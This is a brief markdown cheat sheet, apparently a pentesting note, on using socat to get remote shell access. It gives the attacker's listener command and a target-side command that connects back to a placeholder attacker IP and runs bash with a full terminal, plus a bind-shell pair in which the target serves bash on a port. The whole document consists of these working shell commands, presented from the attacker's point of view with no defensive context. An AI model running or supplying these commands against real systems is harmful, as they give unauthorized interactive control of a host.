# Socat

## Reverse Shell

- Shell handler (attacker)

`$ socat tcp-listen:<PORT>,reuseaddr,fork file:`tty`,raw,echo=0`

- Connect to attacker

`$ socat tcp:<attacker_IP>:<PORT> exec:bash,pty,stderr,setsid,sigint,sane`

## Bind Shell

- Shell handler (target)

```
$ socat tcp-listen:<PORT>,reuseaddr,fork exec:bash,pty,stderr,setsid,sigint,sane

$ socat file:`tty`,raw,echo=0 tcp:<target_IP>:<PORT>
```